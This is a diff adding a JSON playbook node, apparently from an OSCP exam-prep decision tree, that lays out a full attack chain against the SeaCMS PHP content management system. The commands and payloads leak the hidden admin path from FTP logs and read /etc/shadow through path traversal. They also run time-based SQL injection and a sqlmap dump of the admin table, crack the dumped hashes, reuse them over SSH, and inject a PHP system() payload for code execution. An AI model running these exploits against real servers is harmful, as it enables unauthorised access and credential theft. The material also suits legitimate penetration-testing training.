@@ -1,0 +1,30 @@
+{
+  "id": "seacms",
+  "phase": "WEB",
+  "title": "SeaCMS — Fingerprint, Hidden Admin, SQLi, RCE",
+  "body": "SeaCMS (海洋CMS) is a Chinese PHP CMS. Fingerprint it by the SQL dumps in /install/ (seacms.sql, seacmsdata.sql), the gbook.php/member.php/login.php structure, and the install/install_lock.txt presence. The admin panel is in a randomised directory (e.g. /th4o4p/) — this slug is NOT findable by wordlist; it leaks through FTP logs, error logs in /data/, or the config files. Once you have the slug, the admin_pay.php endpoint is SQLi-vulnerable and admin_ip.php is RCE if you're authenticated.\n\nThe intended OSCP-safe chain: FTP anonymous → logs contain the slug → SQLi on admin_pay.php → dump sea_admin table → decode credentials (base64 or MD5) → SSH. sqlmap is out of scope on OSCP — use manual time-based SQLi or the sqli_time node.",
+  "cmd": "# ══════════════════════════════════════════════════\n# 1 — FINGERPRINT SeaCMS\n# ══════════════════════════════════════════════════\n# These files are unique to SeaCMS:\ncurl -s http://<IP>/install/seacms.sql | head -5\ncurl -s http://<IP>/install/seacmsdata.sql | head -5\ncurl -s http://<IP>/install/install_lock.txt\n# Also: gbook.php, member.php, database.php at root\n\n# ══════════════════════════════════════════════════\n# 2 — FIND THE RANDOMISED ADMIN SLUG\n# ══════════════════════════════════════════════════\n# Method A — FTP logs (fastest — get all logs):\nftp <IP>\n# anonymous / anonymous\nftp> mget *.log\nftp> bye\ngrep -hriE 'admin_|th[0-9a-z]{4,}|/[a-z0-9]{5,8}/admin' *.log | head -20\n# Look for paths like: /th4o4p/admin_pay.php, /5f9js3/admin_ip.php\n\n# Method B — /data/ directory listing (if enabled):\ncurl -s http://<IP>/data/ | grep -i admin\n\n# Method C — error logs in /data/:\ncurl -s http://<IP>/data/cron.cache.php\nfor f in config.user.inc config.cache.inc common.inc; do\n  curl -s http://<IP>/data/$f.php\ndone\n\n# ══════════════════════════════════════════════════\n# 3 — VERIFY THE SLUG (confirm admin files exist)\n# ══════════════════════════════════════════════════\ncurl -s -o /dev/null -w \"%{http_code}\\n\" http://<IP>/<SLUG>/admin_pay.php\ncurl -s -o /dev/null -w \"%{http_code}\\n\" http://<IP>/<SLUG>/admin_ip.php\ncurl -s -o /dev/null -w \"%{http_code}\\n\" http://<IP>/<SLUG>/database.php\n# 200 = confirmed. 404 = wrong slug.\n\n# ══════════════════════════════════════════════════\n# 4 — LFI via admin_safe.php (no auth needed)\n# ══════════════════════════════════════════════════\n# Read arbitrary files as the web user:\ncurl -s \"http://<IP>/<SLUG>/admin_safe.php?action=download&file=../../../../../../etc/passwd\"\ncurl -s \"http://<IP>/<SLUG>/admin_safe.php?action=download&file=../data/config.user.inc.php\"\ncurl -s \"http://<IP>/<SLUG>/admin_safe.php?action=download&file=../../../../../../etc/shadow\"\n\n# ══════════════════════════════════════════════════\n# 5 — SQLi on admin_pay.php (id parameter)\n# ══════════════════════════════════════════════════\n# Confirm injection (time-based — page should take 5+ seconds):\ncurl -s -o /dev/null -w \"%{time_total}\\n\" \\\n  \"http://<IP>/<SLUG>/admin_pay.php?action=del&id=1' AND SLEEP(5)-- -\"\n\n# Manual extraction — get admin table (see sqli_time node for full technique):\n# Table: seacms.sea_admin  Columns: id,name,password,groupid\n# Extract name of row 1:\ncurl -s \"http://<IP>/<SLUG>/admin_pay.php?action=del&id=1' AND (SELECT SLEEP(5) FROM sea_admin WHERE id=1 AND SUBSTRING(name,1,1)='a')-- -\"\n\n# Or use sqlmap (NOT on OSCP exam):\nsqlmap -u \"http://<IP>/<SLUG>/admin_pay.php?action=del&id=1\" \\\n  -p id --batch -D seacms -T sea_admin --dump --technique=T --time-sec=2\n\n# ══════════════════════════════════════════════════\n# 6 — DECODE THE PASSWORD\n# ══════════════════════════════════════════════════\n# SeaCMS stores passwords as base64 OR MD5:\n# Base64 (ends with ==): decode directly:\necho 'WW91cmVHb25uYU1ha2VJdDg0Ng==' | base64 -d\n\n# MD5 (32 hex chars): crack with hashcat or online:\nhashcat -m 0 e10da9e6a47cbaa2f663 /usr/share/wordlists/rockyou.txt\n# or: https://crackstation.net\n\n# ══════════════════════════════════════════════════\n# 7 — USE THE CREDENTIALS\n# ══════════════════════════════════════════════════\n# Try SSH first — often the same password:\nssh <user>@<IP>\n\n# Or log into the admin panel:\n# http://<IP>/<SLUG>/  → admin_ip.php for RCE (authenticated)\n# Payload in ip field: \";system('id');//",
+  "warn": "sqlmap is OUT OF SCOPE on OSCP. Use manual time-based SQLi (see sqli_time node) or the LFI via admin_safe.php which requires no auth at all. The randomised admin slug is never in any wordlist — it always leaks through a log file, error message, or config exposure. If you can't find it via FTP, check the /data/ directory listing and all files under /install/. The login.php has a CAPTCHA — the admin panel login typically does not.",
+  "choices": [
+    {
+      "label": "Got credentials — try SSH",
+      "next": "use_creds_first"
+    },
+    {
+      "label": "LFI working — hunt for more creds/keys",
+      "next": "linux_password_hunt"
+    },
+    {
+      "label": "SQLi confirmed — manual time-based extraction",
+      "next": "sqli_time"
+    },
+    {
+      "label": "Got shell — privesc",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "Back to web enum",
+      "next": "web_enum"
+    }
+  ]
+}
